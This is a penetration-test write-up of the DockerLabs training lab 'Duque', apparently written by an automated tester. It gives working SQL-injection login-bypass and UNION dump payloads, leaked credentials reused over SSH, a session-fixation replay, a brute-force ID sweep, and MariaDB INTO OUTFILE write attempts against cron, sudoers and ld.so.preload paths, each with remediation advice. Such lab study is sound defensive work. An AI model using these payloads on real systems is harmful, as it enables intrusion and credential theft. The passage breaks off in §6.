# DUQUE — DockerLabs lab (id 243, "fácil")

> Lab description from the catalogue (`download-labs.sh list`, line 15 of 205, verbatim):
> *"Laboratorio para practicar hacking web con la explotación de dos vulnerabilidades."*
>
> Manifest line, already present, not duplicated by me:
> `243|Duque|facil|two web vulnerabilities; tests whether a second finding gets filed separately`

**Outcome: the two declared web bugs are real, they are filed separately (§3 F1, F2), and
they are NOT a chain — each is reachable on its own, and I prove it (§5). The lab's own
source mislabels the second one: it calls an admin-gated hardcoded-credential disclosure
an IDOR, and it is not one (§2.2). Three further issues the lab does not advertise were
found (§3 F3, F4, F5), plus one escalation that did not work and is filed on its own
(§3 F6). Two of those three undeclared issues are reachable only through the declared
ones, and that composition is the finding (§5). No reward artifact exists (§9).**

---

## 1. Surface

### 1.1 TCP scan (verbatim)

```
$ nmap -sV -Pn -p- 172.17.0.4
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-30 13:05 +0000
Nmap scan report for 172.17.0.4
Host is up (0.000047s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```

(Re-taken after the restore, so the quote is a single consistent run. An earlier
pre-restore scan reported `0.000046s` and `7.35 seconds`; the port set was identical
across both.)

The "trípleta", run in order:

| Step | Result |
|---|---|
| **Reachable** | `22/tcp` and `80/tcp`. `GET /` → `200`, **11 622 bytes**. `GET /bills/` → `200`, **4 676 bytes** — a login form the root page does not link to. |
| **What the body carries** | `/bills/index.php` posts `username`/`password`. `GET /bills/panel.php` with no cookie → `302` to `/bills/index.php`. |
| **Decisive** | `bills/index.php:9` — a request parameter interpolated into SQL — and `panel.php:270` — a request parameter compared against a hardcoded literal that returns a password. Both named in the source before a single attack request. |

### 1.2 Stack and versions — read from the artefact, not from memory

Every number below is the tool's own output inside the container, pasted verbatim.

```
$ apache2ctl -v
Server version: Apache/2.4.52 (Ubuntu)
Server built:   2026-03-05T18:04:29T

$ php -v
PHP 8.1.2-1ubuntu2.23 (cli) (built: Jan  7 2026 08:37:41) (NTS)
Zend Engine v4.1.2, Zend OPcache v8.1.2-1ubuntu2.23

$ mysqld --version
mysqld  Ver 10.6.23-MariaDB-0ubuntu0.22.04.1 for debian-linux-gnu on x86_64 (Ubuntu 22.04)

$ ssh -V
OpenSSH_8.9p1 Ubuntu-3ubuntu0.15, OpenSSL 3.0.2 15 Mar 2022

$ grep VERSION /etc/os-release
VERSION_ID="22.04"
PRETTY_NAME="Ubuntu 22.04.5 LTS"
```

**Is the artefact what the manifest says? Yes, and that is worth stating precisely,
because the label is unusually honest.** The manifest names *no platform* — it says
*"two web vulnerabilities"* — and the catalogue says only *"hacking web"*. There is no
WordPress, no Joomla, no framework: the docroot is **8 hand-written files, 3 of them
PHP**, on stock Apache with stock PHP and stock MariaDB. Nothing in the label is
wrong, so rule 1 of the brief finds nothing to report here, and I am not going to
manufacture a mismatch to have something to say.

What the label *understates* is the attack surface, and that is a real observation:
the description says **"hacking web"**, and the lab's own secret turns out to be an
**OS account password** (§3 F2). One of the two declared bugs leaves the web tier
entirely. A tester who read "hacking web" and stopped at the web tier would have
collected both declared findings and none of the impact.

The entrypoint is the topology, read from `auto_deploy.sh` and **not run** (it ends in
`while true` at line 145):

```
/bin/sh -c service mariadb start && service ssh start && sleep 3 && apachectl -D FOREGROUND
```

One container, no compose file, no second host, no `macvlan`, no pivot. `auto_deploy.sh`
names no networks at all, so there is no segmentation to confirm before stepping
through it.

**One version number in this environment is not the artefact's, and I will not report
against it.** `uname -a` returns `7.0.0-34-generic` — a kernel newer than anything in
this 22.04 userspace, and a 6.x/24.04-built string. That is the **host** kernel shared
by every container on this Docker daemon, not something the lab ships. Testing or
reporting a kernel CVE against it would be reporting a property of the operator's
machine as a property of the target.

### 1.3 Hidden surfaces — what the TCP scan cannot see

`nmap -p-` is TCP. Checked the other way round, from inside:

```
$ cat /proc/net/udp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
```

Header only — **zero** UDP sockets, so there is no BMC/IPMI-class blind spot here. And
`/proc/net/tcp` gives the full listening set including the one socket the scan cannot
report because it is bound to loopback:

```
   0: 0100007F:0CEA 00000000:0000 0A ...   uid 103     <- 127.0.0.1:3306, mariadbd
   1: 00000000:0016 00000000:0000 0A ...   uid 0       <- 0.0.0.0:22
   2: 00000000:0050 00000000:0000 0A ...   uid 0       <- 0.0.0.0:80
```

`3306` is MariaDB on loopback, confirmed as **running**, not merely installed
(§23): `pid=131 Name: mariadbd`. Its presence matters in §3 F5.

HTTP enumeration, 10 paths, all with the byte count so that "not found" and "found but
empty" stay distinguishable:

```
200 11622  /
200  1186  /empleados/
200  1889  /intranet/
200  4780  /normativa/
200  5190  /proveedores/
200  4676  /bills/
200  4676  /bills/index.php
302     0  /bills/panel.php
404   272  /robots.txt
404   272  /.git/HEAD
403   275  /server-status
```

The four `index.html` pages are static content with no forms, no scripts and no
`href`/`src` off the page — read, not guessed at. `/intranet/` and `/empleados/` are
static "Acceso Denegado" pages, **not** an access-control mechanism: there is no
server-side check behind them, they are the denial. The entire dynamic surface of this
lab is `/bills/`, three files.

---

## 2. What the lab declares, and what it actually is

### 2.1 The two declared vulnerabilities, located

The source names both, in its own comments, and the names are load-bearing evidence:

```
bills/panel.php:2: // Panel de Gestión de Facturas - NaturGas Solutions
bills/panel.php:3: // Vulnerabilidad IDOR (Insecure Direct Object Reference)
bills/panel.php:4: // Formato de ID: xy + [letra minúscula] + [tres números]
```

and, for the injection, only implicitly — the sink is the string on line 9:

```php
 9:     $query = "SELECT * FROM users WHERE username = '$user' AND passwd = '$pass'";
```

| Declared | Sink | My finding |
|---|---|---|
| "vulnerabilidad" #1 | `bills/index.php:9` — both POST fields interpolated into SQL | **F1**, CWE-89 |
| "vulnerabilidad" #2 | `bills/panel.php:270` — `if ($id === 'xyc724')` | **F2**, CWE-798 + CWE-200 |

### 2.2 The lab misattributes its own second vulnerability — this is a lab defect

`panel.php:3` calls F2 an **IDOR**. It is not one, and the difference is not a matter of
taste: an IDOR is *my session, their object*, and this handler has no second identity
to be "their". Every line of the reach path is in front of me:

```php
  9: if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
 10:     header('Location: /bills/index.php');
 11:     exit;
 12: }
 13:
 14: $isAdmin = ($_SESSION['username'] === 'admin');
...
257: <?php if ($isAdmin): ?>
...
269:     if (!empty($id)) {
270:         if ($id === 'xyc724') {
271:             // ID vulnerable - IDOR - datos sensibles
272:             echo getVulnerableResponse();
```

Line 9 requires a session. Line 14 reduces the session to a boolean. Line 257 puts the
whole invoice block — the search box included — behind that boolean. So the leak is
reachable by **exactly one identity**, the one whose `$_SESSION['username']` is
`'admin'`. Measured, three cases, byte-distinguishable (§4, table "Three cases"):

| Session | Status | Bytes | Body marker |
|---|---|---|---|
| none | `302` → `/bills/index.php` | **0** | — |
| `mario` (authenticated, non-admin) | `200` | **5 467** | `Acceso Denegado` |
| `admin` (authenticated, admin) | `200` | **5 994** | `duquelaje81029557!` |

The middle row is the case that decides the class. In an IDOR that row is the *finding* —
my session, someone else's object. Here it is a **refusal**. The vulnerable branch is
*behind* the authorisation check, not beside it.

There is also no object-ownership model to violate. The "your invoices" the panel hands
out are two hardcoded links (`panel.php:291-292`), identical for every user, and the
`$database` array (`panel.php:19-24`) is a flat list of 20 strings with no owner column.
There is no per-user object anywhere in this application.

**What F2 actually is:** a credential committed to the source file and disclosed to any
administrator. CWE-798 (hardcoded credentials) + CWE-200. The `// IDOR` comment at
line 3 and the `// ID vulnerable - IDOR - datos sensibles` at line 271 are both wrong, and the
`$isAdmin` gate at line 257 means the *author wrote a correct access-control check and
then mislabelled what sits behind it*.

This is the corpus's existing "lab reports a defect in its own design" class (labs 102,
108, 112, 220) — but note the difference, because it matters for how the client reads
the report: **the catalogue description does not misattribute anything.** It says
"two vulnerabilities" and names neither. The misattribution is in the artefact's own
comment, i.e. it is the lab's internal labelling that is wrong, not the platform's
catalogue. A report that said "the description misattributes the escalation" would be
wrong, and I checked the description in full before saying so.

### 2.3 A second dead control, for the same reason

```php
 26: // Validación de formato: debe empezar con 'xy' + letra minúscula + 3 números
 27: function isValidFormat($id) {
 28:     return preg_match('/^xy[a-z][0-9]{3}$/', $id);
 29: }
```

`grep -n 'isValidFormat' /var/www/html/bills/panel.php` returns **one** line: the
definition. It is never called. The "format validation" the comment advertises does not
exist at runtime — the only tests on `$id` are the `===` at 270, the `in_array` at 273,
and the `else` at 276.

The lab ships **three** controls that look like they explain the behaviour. Two of them
(the equal-length response, §6; and this validator) are inert, and the one whose comment
names the exact vulnerability class is the dead one. This is lab 146's shape exactly.

---

## 3. Findings

Six, filed separately. Two are the declared ones; three the lab does not advertise; and
the sixth is an escalation that **did not work**, kept apart on purpose — merging it
into F5 would tell the client they patched something that is still there.

---

### F1 — SQL injection in the login form, unauthenticated (Critical)

**CWE-89** (Improper Neutralization of Special Elements used in an SQL Command).

**Entry criterion:** does a request parameter reach the SQL string with no escaping, no
prepared statement and no type coercion? Yes — and both parameters, not one.

**Evidence, verbatim from the artefact:**

```php
bills/index.php: 3: $conn = mysqli_connect("127.0.0.1", "root", "", "register");
bills/index.php: 7:     $user = $_POST['username'];
bills/index.php: 8:     $pass = $_POST['password'];
bills/index.php: 9:     $query = "SELECT * FROM users WHERE username = '$user' AND passwd = '$pass'";
bills/index.php:10:     $result = mysqli_query($conn, $query);
```

**The discriminator** (RUNBOOK §5, SQLi row: *two payloads, same filter property,
different execution result*). There is no filter at all, so the property under test is
"does the injected boolean change the row set". The two payloads differ by **one
literal**:

| # | `username` | http | bytes | body |
|---|---|---|---|---|
| C1 | `admin' -- ` | `200` | **79** | `Login success: Admin` |
| C2 | `admin' AND '1'='2' -- ` | `200` | **4 787** | `Login fallido. Usuario o contraseña incorrectos.` |
| C3 | `admin` (no injection) | `200` | **4 787** | `Login fallido. Usuario o contraseña incorrectos.` |

C1 and C2 are the pair; C3 is the negative control that proves C2's failure is the
injection being *false* and not the endpoint being broken. **79 vs 4 787 bytes is the
oracle, and it has fired.**

The password field is the same sink and is independently injectable:

```
POST username=Mario  password=' OR '1'='1   ->  200, 79 bytes, "Login success: Mario"
```

**Data recovered** (UNION, 3 columns — the column count established by measurement, not
guessed: `UNION SELECT 1,2,3` → `200`/75 B while 1, 2, 4 and 5 columns each → `500`/0 B,
so the mismatched counts are visibly errors and not silent negatives):

```
id | username | passwd
 1 | Mario    | mario123
 2 | Jesus    | jesus2026
 3 | Admin    | admin123
```

**Impact:** unauthenticated read and write of the whole `register` database, and
unauthenticated authentication bypass into any account. Reaches the DB as
`root@localhost` (see F5 for why that is worse than it looks).

**Root cause:** string interpolation into SQL. **Fix:** prepared statements with bound
parameters, for both fields; the DB account should not be `root`.

---

### F2 — Hardcoded credential in source, disclosed to any administrator (Critical)

**CWE-798** (Use of Hard-coded Credentials) + **CWE-200** (Exposure of Sensitive
Information). *Not* CWE-639 — see §2.2 for the measurement that refutes the IDOR label.

**Entry criterion:** does any request-controlled value select a branch that returns a
secret?

**Evidence, verbatim from the artefact:**

```php
bills/panel.php:48: // Función para respuesta vulnerable (diferente longitud)
bills/panel.php:49: function getVulnerableResponse() {
bills/panel.php:50:     return '<div class="field">
bills/panel.php:51:                         <label>Usuario</label>
bills/panel.php:52:                         <div class="value">duque</div>
bills/panel.php:53:                     </div>
bills/panel.php:54:                     <div class="field">
bills/panel.php:55:                         <label>Password</label>
bills/panel.php:56:                         <div class="value">duquelaje81029557!</div>
bills/panel.php:57:                     </div>';
bills/panel.php:58: }
```

and the branch that serves it:

```php
bills/panel.php:270:         if ($id === 'xyc724') {
bills/panel.php:271:             // ID vulnerable - IDOR - datos sensibles
bills/panel.php:272:             echo getVulnerableResponse();
```

**Served bytes, verbatim, from an authenticated admin session:**

```html
208-                    <div class="field">
209-                        <label>Usuario</label>
210-                        <div class="value">duque</div>
211-                    </div>
212-                    <div class="field">
213-                        <label>Password</label>
214-                        <div class="value">duquelaje81029557!</div>
215-                    </div>
```

**The impact statement is the part that matters, and it is not "an IDOR".** The leaked
credential is not a fictional account. It is a **live host account**:

```
$ grep duque /etc/passwd
duque:x:1000:1000::/home/duque:/bin/bash
```

Used as-is, from outside, over SSH:

```
$ id
uid=1000(duque) gid=1000(duque) groups=1000(duque)
$ grep -E '^(Uid|Gid)' /proc/self/status
Uid:	1000	1000	1000	1000
Gid:	1000	1000	1000	1000
$ whoami
duque
```

`real = effective = saved = filesystem = 1000`. **No setuid transition at this hop** —
all four fields are 1000, which is the measurement, not the word "unprivileged".

So F2 is a **web-to-host trust-boundary crossing**: a defect in a PHP billing panel
yields an interactive shell on the operating system. That is a different severity
argument from "an IDOR let me see a record", and the distinction is the reason the
mislabelling matters.

**Negative controls on the SSH hop, same host, same code path, same session library:**

| Attempt | Result |
|---|---|
| `duque` / `duquelaje81029557!` (the leaked value) | **ACCEPTED**, `uid=1000(duque)` |
| `duque` / `duquelaje81029557` (one character short) | `Authentication failed` |
| `duque` / *(empty)* | `Authentication failed` |
| `root` / `duquelaje81029557!` | `Authentication failed` |

**Root cause:** a real password committed to a PHP file inside the docroot, plus a
branch that prints it. **Fix:** remove the branch and the literal; move secrets to a
store the web tier cannot read; if the lab needs a low-privilege host account for the
exercise, generate it at build time and never put it in a served file.

---

### F3 — Passwords stored in plaintext (High) — **not advertised by the lab**

**CWE-256** (Plaintext Storage of a Password) / **CWE-522** (Insufficiently Protected
Credentials).

Recovered in §3 F1 and confirmed by logging in with each value **without any
injection**:

| `username` | `password` | http | bytes | body |
|---|---|---|---|---|
| `Mario` | `mario123` | `200` | 79 | `Login success: Mario` |
| `Jesus` | `jesus2026` | `200` | 79 | `Login success: Jesus` |
| `Admin` | `admin123` | `200` | 79 | `Login success: Admin` |
| `Mario` | `mario1234` | `200` | 4 787 | `Login fallido. …` |
| `Admin` | `admin1234` | `200` | 4 787 | `Login fallido. …` |

The last two rows are the negative control: the instrument is not accepting everything.

**Evidence:** the `users` table stores `mario123` in the clear, and the login handler
compares it in the clear (`bills/index.php:9`, `AND passwd = '$pass'`). There is no hash
function anywhere in the application — 3 PHP files, 0 calls to `password_hash`/
`crypt`/`md5`/`sha1` (`grep` over the docroot: 0 matches).

**Impact:** anyone who reaches the database — through F1, through F5, or through a
backup of it — has every user's password in a form that is immediately reusable against
any other service those users have. `admin123` is also guessable without any database
access at all, which is what makes §5 possible.

**Root cause:** passwords compared as plaintext. **Fix:** `password_hash()` /
`password_verify()` with `PASSWORD_DEFAULT`, and a migration of the three rows.

---

### F4 — Session fixation, and a session cookie with neither `HttpOnly` nor `Secure` (High) — **not advertised**

**CWE-384** (Session Fixation) + **CWE-1004** (Sensitive Cookie Without `HttpOnly`)
+ **CWE-614** (Sensitive Cookie Without `Secure`).

**The cookie, verbatim off the wire:**

```
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=4ccb8647bko7f82jlkkoepf4a9; path=/
```

No `HttpOnly`, no `Secure`, no `SameSite`. Measured from the interpreter, not from a
config file — the framework-consumed value, per rule 3:

```
session.cookie_httponly      = ''
session.cookie_secure        = '0'
session.use_strict_mode      = '0'
session.use_only_cookies     = '1'
session.sid_length           = '26'
session.gc_maxlifetime       = '1440'
```

`use_strict_mode = 0` is the load-bearing value: PHP will accept a session ID it did not
issue. And `bills/index.php:2` is the entire session setup — `session_start()`, and no
`session_regenerate_id()` anywhere in the docroot (`grep` → 0 matches).

**The attack, end to end, with the negative control beside it:**

```
attacker-chosen SID: 25k4p7wt7kbe5mfqfuchotd7xy

step 1  victim loads the login page carrying the attacker's SID
step 2  victim authenticates on that same SID   -> "Login success: Mario"
step 3  ATTACKER replays only the SID, from a different client:
          bytes=5467   body: "👤 mario (User)"  "Acceso Denegado"
```

The negative control is the row that makes step 3 mean anything:

```
never-used SID: 302 -> http://172.17.0.4/bills/index.php   (0 bytes)
```

**302 and 0 bytes versus 200 and 5 467 bytes with a rendered identity.** The
attacker-chosen SID carries a live authenticated session; an arbitrary one carries
nothing. There is no way to read step 3 as a coincidence.

**And it chains into F2, which is the finding that makes it High rather than Medium.**
Repeat the same three steps with `Admin` authenticating on the fixated SID, and the
attacker's replay returns the secret with **no credentials of any kind**:

```
attacker-chosen SID #2: f3u6pbdpzz4h2tb5i03zi0xh09
step 2 -> "Login success: Admin"
step 3, attacker replay of the SID alone, GET /bills/panel.php?id=xyc724:
        bytes=5994
        "(Administrator)"
        "<div class="value">duque</div>"
        "duquelaje81029557!"
```

**Honest limit on this finding, stated up front:** I have proved the *hijack*, not the
*delivery*. Fixation requires the cookie to reach the victim's browser, and I found no
XSS in this application to plant it with (§8, NOT tested). The delivery vectors that
remain open are the missing `Secure` flag on a plaintext HTTP service — any network
position between client and server can set the cookie — and any browser-level or
network-level injection. That limit is why F4's impact claim stops at the replay.

**Root cause:** no `session_regenerate_id(true)` on the authentication transition, and
PHP's strict mode left off. **Fix:** regenerate the session ID at login, set
`session.use_strict_mode=1`, `session.cookie_httponly=1`, `session.cookie_secure=1`
(plus HSTS), and serve only over TLS.

---

### F5 — MariaDB `root@localhost` with an empty password, reachable from any local uid (High) — **not advertised**

**CWE-258** (Empty Password in Configuration File) + **CWE-284** (Improper Access
Control) + **CWE-269** (Improper Privilege Management).

**The credential, in the served source:**

```php
bills/index.php: 3: $conn = mysqli_connect("127.0.0.1", "root", "", "register");
```

Empty password, `root`, and the third argument is `""`. Confirmed against the running
server, **not** read off the config file:

```
$ mysql -u root -h 127.0.0.1 --batch -e 'SELECT USER(),CURRENT_USER();'
USER()	CURRENT_USER()
root@localhost	root@localhost

$ SHOW GRANTS FOR CURRENT_USER();
Grants for root@localhost
GRANT ALL PRIVILEGES ON *.* TO `root`@`localhost` WITH GRANT OPTION
GRANT PROXY ON ''@'%' TO `root`@`localhost` WITH GRANT OPTION
```

**The `localhost` in the grant is the finding.** It is the MariaDB `localhost` account,
matched over TCP to `127.0.0.1`, so it is *not* the `unix_socket`-authenticated plugin
account that would refuse a network connection. It authenticates on an **empty
password**, and it holds `ALL PRIVILEGES ON *.*` **with grant option**.

**And the reachability is the part that turns a bad password into a boundary failure.**
The above was run from an **unprivileged interactive shell**, over SSH, as `uid=1000`:

```
$ id
uid=1000(duque) gid=1000(duque) groups=1000(duque)
$ mysql -u root -h 127.0.0.1 register --batch -e "SELECT 1;"
1
```

So the escalation is: *any* local account, however unprivileged, is full DBA of every
database on the host. There is no `mysqld` network exposure to blame — 3306 is bound to
`127.0.0.1` only, confirmed in `/proc/net/tcp` — this is a purely local boundary
failure, and it means F1's severity does not depend on the web tier being the only way
in.

**What that privilege actually buys, measured with `secure_file_priv` read first:**

```
$ SELECT IFNULL(@@secure_file_priv,'<NULL/unset>'), @@plugin_dir, @@datadir;
<NULL/unset>   /usr/lib/mysql/plugin/   /var/lib/mysql/
```

`secure_file_priv` is **unset**, so `LOAD_FILE` and `INTO OUTFILE`/`DUMPFILE` are
unrestricted by policy. That makes this a file primitive. What it is worth is F6.

**Root cause:** an empty password on the database superuser, with no `unix_socket`
plugin and no least-privilege account for the application. **Fix:** set a real password
or move to `unix_socket` for the DBA account, create a dedicated
`GRANT SELECT, INSERT, UPDATE ON register.*` account for `bills/`, and set
`secure_file_priv` to a directory the server needs and nothing else.

---

### F6 — The escalation that did **not** work: F5 does not reach OS root (Informational, filed separately)

Kept as its own entry on purpose. Folding this into F5 would tell the client that
patching F5 closed a root escalation. It does not, and the reason is specific.

**Oracle first, because a file-write vector with no oracle is a claim about the future
(§6–7).** A uniquely-marked payload, `DUQUE243_MARKER_b3f91c`, written through
`INTO OUTFILE` from the `duque` shell, then read back as an OS user:

```
/tmp/duque243_v3.txt   before=NO  after=YES owner=mysql(103)  marker=1  WROTE-BY-ME
```

The vector fires. **The file is owned by `mysql`, uid 103** — and that is the whole
answer, confirmed from the daemon's own `/proc`, not inferred from a mode:

```
$ cat /proc/132/status     # the mariadbd that performed the write
Name:	mariadbd
Uid:	103	103	103	103
Gid:	104	104	104	104
```

`real = effective = saved = filesystem = 103`. **No setuid transition.** The database
superuser is not the operating-system superuser, and a DBA cannot become root merely by
being a DBA.

**Nine write attempts, one success, and the success is in the wrong directory.** Each
attempt is a real `INTO OUTFILE`, verified by marker and not by existence (see §7.1 for
why that distinction is load-bearing):

| Target path | Before | After | Owner | Marker | Verdict |
|---|---|---|---|---|---|
| `/tmp/duque243_v3.txt` | NO | YES | `mysql(103)` | 1 | **WROTE-BY-ME** |
| `/usr/lib/php/sessionclean` | YES | YES | `root(0)` | 0 | PREEXISTING, **not** written (`ERROR 1086 already exists`) |
| `/etc/cron.d/duque243` | NO | NO | — | 0 | DENIED, `Errcode: 13` |
| `/etc/ld.so.preload` | NO | NO | — | 0 | DENIED, `Errcode: 13` |
| `/etc/sudoers.d/duque243` | NO | NO | — | 0 | DENIED, `Errcode: 13` |
| `/root/duque243` | NO | NO | — | 0 | DENIED, `Errcode: 13` |
| `/var/www/html/bills/duque243.php` | NO | NO | — | 0 | DENIED, `Errcode: 13` |
| `/usr/local/bin/duque243` | NO | NO | — | 0 | DENIED, `Errcode: 13` |
| `/etc/profile.d/duque243.sh` | NO | NO | — | 0 | DENIED, `Errcode: 13` |

**7 of 7 root-consumed or web-consumed paths denied.** The one root-executed cron job on
this host (`/etc/cron.d/php`, `09,39 * * * *`, runs `/usr/lib/php/sessionclean` as root)
is the obvious target and is not writable — the write returns `Errcode: 13`, and the
target file it invokes is `root(0) 755` with `mtime` still `2022-01-28 00:27:02`.

**The remaining escalation surface from `uid=1000(duque)`, each measured as `duque`:**

| Vector | Measurement | Verdict |
|---|---|---|
| `sudo` | `Sorry, user duque may not run sudo on 74c0aa27e3ec.` | not granted |
| `su root` with the leaked password | `su: Authentication failure` | denied |
| SUID/SGID binaries | **18** found as root, all stock Ubuntu, none identity-changing without a root password | no vector |
| File capabilities | `getcap /bin/bash /bin/sh /usr/bin/python3` → **empty** | none |
| Writable files (`find -writable`, as `duque`) | **4**, all under `/home/duque` | no system path |
| Same predicate, second tool (`test -w`, as `duque`) | `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/usr/local/bin/sudo`, `/etc/cron.d` → all `no` | **agrees** |
| Webroot writability (`test -w`, as `duque`) | `/var/www/html`, `/bills`, `panel.php`, `index.php` → all `no` | not writable |
| `PATH` directories writable by `duque` | **8** checked, all `no` | no hijack |
| `/etc/sudoers.d/` | only `README`, `root(0)`, `-r--r-----` | no grant |
| Docker socket | `/var/run/docker.sock` → `No such file or directory` | absent |
| `/etc/shadow` | `cat: /etc/shadow: Permission denied` | not readable |
| root over SSH | 3 attempts (wrong / empty / the leaked value) → `Authentication failed` ×3 | refused |

**Conclusion: no path from `uid=1000(duque)` to `uid=0(root)` was found, and the two
tools that could have disagreed about writability agreed.** The lab does not ship a
root escalation, and the description does not claim one — so unlike lab 189 there is no
misattributed root to correct. F5 is a real boundary failure with real consequences
(full DBA, arbitrary file write as `mysql`, unrestricted `LOAD_FILE` of anything
world-readable) that stops one step short of root, and the stop is measured.

---

## 4. The chain

Every hop carries the measured identity, and every hop is quoted. No hop is asserted.

| # | → | Mechanism | Identity proof (verbatim) |
|---|---|---|---|
| 0 | attacker, unauthenticated | `POST /bills/index.php` — no cookie, no credential | `GET /bills/panel.php` → `302`, **0 bytes** |
| 1 | **`root@localhost` on MariaDB** (web tier) | F1, SQLi. Execution identity of the PHP process | Apache children: `Name: apache2` / `Uid: 33 33 33 33` (master pid 224 is `Uid: 0 0 0 0` — the master is root, the request handlers are not). DB session: `CURRENT_USER() = root@localhost` |
| 2 | **administrator session** | F1 (`admin' -- `) *or* F3 (`Admin`/`admin123`) — two independent routes | `Login success: Admin`; rendered identity `👤 admin (Administrator)` |
| 3 | **the leaked credential** | F2, `panel.php:270` `=== 'xyc724'` | response `200`, **5 994 bytes**, body contains `duquelaje81029557!` |
| 4 | **interactive shell on the host** | SSH with the value from step 3 | `uid=1000(duque) gid=1000(duque) groups=1000(duque)`; `Uid: 1000 1000 1000 1000`; `whoami` → `duque` |
| 5 | **full DBA, as a local uid** | F5, empty-password `root@localhost` reached over loopback from the step-4 shell | `USER() = root@localhost`, `CURRENT_USER() = root@localhost`, `GRANT ALL PRIVILEGES ON *.* … WITH GRANT OPTION`; still `uid=1000(duque)` in the shell |
| 6 | ~~root~~ | **did not happen** — F6 | the write landed as `mysql(103)`; `mariadbd` `Uid: 103 103 103 103`; 7/7 root-consumed paths `Errcode: 13` |

Steps 1→2 and 3→4 are the two declared bugs. Step 5 is undeclared. Step 6 is the
escalation that failed and is reported as such.

**The `xyc724` identifier was not guessed — it was enumerated, with a count.** The
panel's own default view hands out two ids, both generic. The leak id is not linked
anywhere. So the length of the response was used as the detector:

| Response size | Meaning | Count in the sweep |
|---|---|---|
| **5 906** | `Factura no encontrada` | **25 979** |
| **6 163** | the generic invoice | **20** |
| **5 994** | **the leak** | **1** |

The full formatted identifier space the panel documents — `xy` + one lowercase letter +
three digits — is 26 × 1 000 = **26 000**. All 26 000 were requested in 31.5 s
(825 req/s, 20-way parallel) and each result recorded individually:

```
total candidates tested: 26000
distinct sizes: 25979×5906, 20×6163, 1×5994
ids whose size is not the 5906 baseline: 21
ids whose size is neither baseline nor generic: xyc724 (5994)
content re-verified on that id: leakcount=1
```

25 979 + 20 + 1 = 26 000. **The detector is proven in both directions:** it fired on
exactly one id, that id was then confirmed by *content* rather than by size
(`leakcount=1`), and 25 999 others returned the two baselines. This is what the equal-
length design (§6) failed to prevent — and note the sweep was run as `admin`, because
that is the only identity the handler admits.

---

## 5. Are the two declared vulnerabilities independent? — and is the escalation misattributed?

These are two separate questions and they have two different answers.

### 5.1 They are genuinely independent — neither enables the other

This is the question the brief asks, and the honest answer is the one that is easiest to
get wrong in the other direction. The obvious hypothesis is "the SQLi is the entry, and
the IDOR-ish branch is the prize, so it is a chain." **That hypothesis is false, and it
is falsified by a login that contains no injection at all:**

```
$ curl -XPOST -d 'username=Admin' -d 'password=admin123' /bills/index.php
http/bytes=200 79   Login success: Admin
```

`Admin` / `admin123` is a working credential pair, because F3 stores passwords in
plaintext and the author chose a guessable one. So:

| | Entry path for F2 | Needs F1? |
|---|---|---|
| Route A | `Admin` / `admin123`, no injection — **measured, 200/79 B** | **no** |
| Route B | `admin' -- `, SQLi — **measured, 200/79 B** | yes |

and symmetrically, F1 is exploitable with no reference to F2 whatsoever — the `UNION`
dump in §3 F1 used no session and no panel access.

**Why this matters to the client, and it is not a technicality.** If the two were filed
as one chain, the natural remediation is "fix the SQLi", and fixing F1 leaves F2
completely intact and reachable by anyone who types `admin123`. Filed separately, the
report says what is true: **two independent defects, each with its own fix, either of
which alone reaches the same secret.** The independence is the finding.

**What they share is an endpoint, not a dependency.** Both terminate at the same leaked
credential, and both hand off to the same SSH hop — so the *impact* is coupled even
though the *reachability* is not. That is the correct way to state it: not a chain,
and not two unrelated bugs either.

### 5.2 The escalation is not misattributed by the description — but the source is

Covered in full at §2.2, and the distinction is worth repeating because it changes what
gets written in the report:

- **The catalogue description** — *"Laboratorio para practicar hacking web con la
  explotación de dos vulnerabilidades."* — names **no class, no path, and no escalation**.
  There is nothing in it to misattribute. Read in full, not paraphrased.
- **The artefact's own comment** (`panel.php:3`, and again at `panel.php:271`) calls F2
  an **IDOR**. That is wrong, and §2.2 carries the measurement that refutes it: the
  middle case of the three is a **refusal**, not a cross-user read.

So: **a lab design defect, filed as such, and it is a labelling defect rather than a
chain defect.** The lab's *escalation* claim — two web bugs — is accurate. The lab's
*class label* for the second one is not. Contrast lab 189, where the description named
a root path that did not exist and the real root came from a third undeclared bug; here
the description names nothing, and the undeclared third issue (F5) is a privilege
failure that does not reach root.

### 5.3 The undeclared issues, and which of them the declared ones enable

**The most valuable output of this engagement is that three of the six findings are not
in the lab's description.** Stated explicitly, as the brief asks:

| Finding | Advertised? | Reachable how? |
|---|---|---|
| F1 SQLi | **yes** | unauthenticated |
| F2 hardcoded credential | **yes** | admin session — from F1 **or** from F3 alone |
| F3 plaintext passwords | **no** | unauthenticated via F1; the guessable value is public |
| F4 session fixation | **no** | needs a cookie delivered to a victim (**NOT tested**, §8) |
| F5 empty-password DBA | **no** | any local uid — reached here **through F2's SSH hop** |
| F6 escalation that failed | **no** | the negative half of F5 |

**Two composition findings, each distinct from either component:**

1. **F2 → F5 is a genuine two-stage chain, and it is the one that matters.** The web
   panel leaks a host password; that password opens a host shell; that shell is
   accepted as the database superuser because the password is empty. The end state is
   full DBA, and **neither F2 nor F5 alone gets there.** F5 alone is only reachable from
   a local shell, and the only local shell in the lab is the one F2 hands over. This is
   the finding the description's "hacking web" framing hides entirely.
2. **F4 → F2 removes the credential requirement.** Fixation delivers an authenticated
   session without any password, and an admin session is the gate on F2 (§4). So F4 is
   not an independent medium-severity session bug — it is a way to reach the lab's
   headline secret with zero credentials. Its limit is delivery, not impact (§8).

---

## 6. Controls that held

A control that has never fired is not a control. Every row below names the positive
control that proves the detector can see a success.

| Control | Where | Positive control that proves this detector works |
|---|---|---|
| `require` on the session, before any invoice data | `panel.php:9-12` | Fired: anonymous `id=xyc724` → `302`, **0 bytes**, `Location: /bills/index.php`. A 200 with a body would mean the gate failed. |
